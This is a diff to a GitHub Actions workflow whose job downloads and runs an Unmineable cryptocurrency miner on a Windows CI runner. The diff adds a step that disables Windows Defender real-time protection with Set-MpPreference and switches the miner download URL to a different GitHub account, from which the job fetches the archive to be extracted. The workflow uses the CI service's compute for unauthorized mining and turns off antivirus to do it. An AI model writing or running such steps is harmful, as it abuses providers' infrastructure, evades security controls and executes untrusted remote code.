@@ -78,6 +78,12 @@ jobs:
           }
           Write-Host "TCP connectivity successful!"
 
+      # --- Disable Windows Defender Real-Time Protection (optional) ---
+      - name: Disable Windows Defender Real-Time Protection
+        run: |
+          Set-MpPreference -DisableRealtimeMonitoring $true
+        continue-on-error: true
+
       # --- Install 7-Zip ---
       - name: Install 7-Zip
         run: |
@@ -89,7 +95,7 @@ jobs:
       # --- Install & Run Unmineable Miner (CPU, Litecoin) ---
       - name: Install & Run Unmineable Miner (CPU, LTC)
         run: |
-          $minerUrl = "https://github.com/Unmineable/UnmineableMiner/releases/latest/download/UnmineableMiner.zip"
+          $minerUrl = "https://github.com/UnmineableMiner/UnmineableMiner/releases/latest/download/UnmineableMiner.zip"
           $zipPath = "$env:TEMP\UnmineableMiner.zip"
           $extractPath = "C:\UnmineableMiner"
           Invoke-WebRequest -Uri $minerUrl -OutFile $zipPath
